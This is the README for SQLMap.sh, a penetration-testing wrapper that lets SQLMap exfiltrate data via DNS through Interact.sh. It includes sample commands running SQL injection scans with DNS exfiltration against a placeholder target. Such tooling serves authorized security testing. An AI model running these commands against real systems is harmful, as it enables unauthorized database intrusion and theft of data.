![SQLMap.sh](./pics/sqlmapsh.png)

[![Go Report Card](https://goreportcard.com/badge/github.com/unlock-security/sqlmapsh)](https://goreportcard.com/report/github.com/unlock-security/sqlmapsh)
[![GPLv3 license](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://github.com/unlock-security/sqlmapsh/blob/main/LICENSE)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/unlock-security/sqlmapsh)](https://github.com/unlock-security/sqlmapsh/releases/latest)
[![Twitter](https://img.shields.io/static/v1?style=flat&logo=twitter&label=Twitter&message=unlock_security&color=blue)](https://www.linkedin.com/company/unlock-security)
[![LinkedIn](https://img.shields.io/static/v1?style=flat&logo=linkedin&label=LinkedIn&message=Unlock+Security&color=blue)](https://www.linkedin.com/company/unlock-security)


SQLMap.sh is a SQLMap wrapper that lets you use Interact.sh as a DNS server for exfiltrating data with zero configuration.

To use the SQLMap `--dns-domain` flag you need to open your port 53 to the internet to let it run its own DNS server and you need a properly configured domain. This is not always possible during a penetration test engagement or maybe you just don't want to buy a domain for this.

SQLMap.sh solves this problem transparently. Just use it as if it is SQLMap and your are done to exfiltrate data via DNS.

## Installation

Run the following command to install the latest version.

```sh
go install github.com/unlock-security/sqlmapsh@latest
```

## Usage

Just replace `sqlmap` with `sudo sqlmapsh` when you want to use SQLMap with data exfiltration via DNS.

> **Note:** SQLMap requires root privileges to perform data exfiltration via DNS because it needs to bind it's own DNS server locally on port 53

For example:

```sh
$ sqlmap -u 'https://www.target.com/page=1' -p page --level=5 --risk=3 --technique=E --banner
```

Become:

```sh
$ sudo sqlmapsh -u 'https://www.target.com/page=1' -p page --level=5 --risk=3 --technique=E --banner
```


## License

[SQLMap.sh](https://github.com/unlock-security/sqlmapsh) is distributed under [GPLv3.0 License](https://github.com/unlock-security/sqlmapsh/blob/main/LICENSE) and made with 💙 by the Unlock Security team.